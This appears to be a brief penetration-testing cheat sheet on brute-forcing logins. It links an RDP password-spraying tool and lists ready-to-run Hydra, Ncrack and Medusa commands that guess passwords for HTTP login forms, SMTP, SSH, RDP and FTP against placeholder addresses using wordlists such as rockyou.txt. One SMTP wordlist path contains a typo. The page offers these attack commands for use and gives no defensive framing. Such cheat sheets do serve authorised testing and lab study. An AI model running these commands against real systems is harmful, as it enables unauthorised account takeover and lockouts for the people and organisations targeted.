---
description: force your way through
---

# Bruteforce

## By Protocol

### RDP

#### RDPassSpray

Link: [https://github.com/xFreed0m/RDPassSpray](https://github.com/xFreed0m/RDPassSpray)



## By Tools

### Hydra 

`hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin` 

**SMTP**:

`hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V` 

**SSH user with password list** 

`hydra -l user -P pass.txt -t 10 10.10.10.10 ssh -s 22` 

### Ncrack 

RDP user with password list 

`ncrack -vv --user offsec -P passwords rdp://10.10.10.10` 

### Medusa 

FTP user with password list 

`medusa -h 10.10.10.10 -u user -P passwords.txt -M ftp` 

